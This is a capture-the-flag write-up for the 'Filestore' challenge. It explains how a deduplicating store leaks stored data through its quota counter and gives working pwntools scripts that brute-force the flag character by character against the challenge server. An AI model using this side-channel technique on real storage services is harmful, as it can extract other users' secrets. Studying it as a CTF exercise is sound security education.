# Filestore

## Challenge description
`We stored our flag on this platform, but forgot to save the id. Can you help us restore it?`

<br />

> TLDR: Brute force the flag via the `store` feature and verify the validity of the flag via the `status` feature. If the storage quota did not increase, the flag is valid. Otherwise, the flag is invalid.

## Program
```console
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
```

The program has `load`, `store`, `status` and `exit` features.
- `load` feature requires me to provide a file id
- `store` feature allows me to store data into the storage and then provides me with a file id
- `status` feature displays storage quota
- `exit` feature exits the program

## Source code analysis
The program splits the input data into multiple substrings and checks whether each of the substrings exists in the storage. If the storage does not contain the substring, the program stores it into the storage.

```python
    # Use deduplication to save space.
    def store(data):
        nonlocal used
        MINIMUM_BLOCK = 16
        MAXIMUM_BLOCK = 1024
        part_list = []
        while data:
            prefix = data[:MINIMUM_BLOCK]
            ind = -1
            bestlen, bestind = 0, -1
            while True:
                ind = blob.find(prefix, ind+1)
                if ind == -1: break
                length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])]))
                if length > bestlen:
                    bestlen, bestind = length, ind

            if bestind != -1:
                part, data = data[:bestlen], data[bestlen:]
                part_list.append((bestind, bestlen))
            else:
                part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:]
                blob[used:used+len(part)] = part
                part_list.append((used, len(part)))
                used += len(part)
                assert used <= len(blob)
```

In other words, the storage quota will not increase if the substring exists in the storage. So, I can brute force the flag by using `store` and `status` features.

## Phrase 1 of brute force
To optimize the brute force process, I filtered out ascii characters that are not used in the flag.

Idea: Provides each of the ascii characters from ‘!’ to ‘}’ (33-125) to the program via the `store` function. Then, use the `status` function to check if the storage quota has increased. If the quota did not increase, then the character is used in the flag. Otherwise, the character is not found in the flag. 

```python
from pwn import *

validChars = []
memory = "0.026kB"

r = remote('filestore.2021.ctfcompetition.com', 1337)
res = r.recvuntil('exit\n')
for char in range(33, 126):
    r.sendline('store')
    res = r.recvuntil('data...\n')
    r.sendline(chr(char))
    res = r.recvuntil('exit\n')
    r.sendline('status')
    res = r.recvuntil('exit\n').split(b'/')[0].strip().split(b'Quota: ')[1].strip()
    if (res.decode() == memory):
        validChars.append(chr(char))
        print(chr(char) + " is inside the memory")
    else:
        print("Not inside the memory")
        memory = res.decode()

print(validChars)
```

The script's output:
```console
$ python3 brute.py
--snip--
{ is inside the memory
Not inside the memory
} is inside the memory
['0', '1', '3', '4', 'C', 'F', 'K', 'M', 'R', 'T', '_', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', '{', '}']
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
```

So, the characters found in the flag are '0', '1', '3', '4', 'C', 'F', 'K', 'M', 'R', 'T', '_', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', '{', '}'

## Phrase 2 of brute force
Idea: Provides `a substring of the flag + a valid flag's character` to the program via the `store` function. Then, check the storage quota via the `status` function. If the storage quota did not increase, submit `the last character of the flag + the valid flag's character` to the program via the `store` feature. (Reasoning: The program verifies each of the substrings with the storage's data. The valid flag's character might be part of the new substring itself when the program splits the input data) Then, check the storage quota via the `status` feature.

On the first run of the program, 
I detected two possible substrings of the flag:
```console
$ python3 brute-2.py
--snip--
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
Interesting: Found multiple new combination: i0 ic
Valid substring: CTF{CR1M3_0f_d3dup1i0
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
--snip--
Valid substring: CTF{CR1M3_0f_d3dup1i0n}
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
Flag: CTF{CR1M3_0f_d3dup1i0n}
```

The script will select the first encountered substring which explains why it chooses 'i0' instead of 'ic'.

However, submitting the above flag fails.

So, I enforce the script to choose the combination “ic” instead of “i0” by modifying the order of the characters in the array.

The working script:
``` python
from pwn import *

#validChars = ['0', '1', '3', '4', 'C', 'F', 'K', 'M', 'R', 'T', '_', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', '{', '}']
validChars = ['c', '0', '1', '3', '4', 'C', 'F', 'K', 'M', 'R', 'T', '_', 'd', 'f', 'i', 'n', 'p', 't', 'u', '{', '}']
badCombination = []
potentialCombination = []
flag = "CTF{"
def verify(char):
    global flag
    substr = flag[-1] + char
    memory = "0.026kB"
    r1 = remote('filestore.2021.ctfcompetition.com', 1337)
    r1.recvuntil("exit\n")
    r1.sendline('store')
    res = r1.recvuntil('data...\n')
    r1.sendline(substr)
    res = r1.recvuntil('exit\n')
    r1.sendline('status')
    res = r1.recvuntil('exit\n').split(b'/')[0].strip().split(b'Quota: ')[1].strip()
    if (res.decode() == memory):
        if substr in badCombination:
            print("Warning: Repeated combination encountered: " + substr)
        else:
            potentialCombination.append(substr)
    r1.close()

while True:
    r = remote('filestore.2021.ctfcompetition.com', 1337)
    r.recvuntil("exit\n")
    memory = "0.026kB"
    for char in validChars:
        r.sendline('store')
        res = r.recvuntil('data...\n')
        r.sendline(flag + char)
        res = r.recvuntil('exit\n')
        r.sendline('status')
        res = r.recvuntil('exit\n').split(b'/')[0].strip().split(b'Quota: ')[1].strip()
        if (res.decode() == memory):
            verify(char)
        else:
            print("Invalid char: " + char)
            memory = res.decode()
        if flag[-1] == '}':
            break
    if len(potentialCombination) > 1:
        print("Interesting: Found multiple new combination: " + ' '.join(potentialCombination))
    badCombination.append(potentialCombination[0])
    flag = flag + potentialCombination[0][-1]   
    potentialCombination.clear()
    print("Valid substring: " + flag)
    r.close()
    if flag[-1] == '}':
        break

print("Flag: " + flag)
```

The script's output:
```console
$ python3 brute-2.py
--snip--
Valid substring: CTF{CR1M3_0f_d3dup1ic4ti0n}
[*] Closed connection to filestore.2021.ctfcompetition.com port 1337
Flag: CTF{CR1M3_0f_d3dup1ic4ti0n}
```

Flag: `CTF{CR1M3_0f_d3dup1ic4ti0n}`